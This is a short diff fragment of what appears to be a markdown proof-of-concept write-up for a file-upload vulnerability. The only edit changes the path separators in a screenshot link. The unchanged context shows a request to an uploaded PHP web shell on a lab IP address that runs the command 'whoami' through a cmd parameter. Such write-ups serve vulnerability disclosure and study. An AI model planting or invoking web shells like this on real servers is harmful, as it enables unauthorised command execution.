@@ -82,4 +82,4 @@ Content-Disposition: form-data; name="btnedit"
 http://192.168.150.131/uploadImage/Profile/test.php?cmd=whoami
 ```
 
-![image-20240505102939350](./screenshot/image-20240505102939350.png)
+![image-20240505102939350](.\screenshot\image-20240505102939350.png)
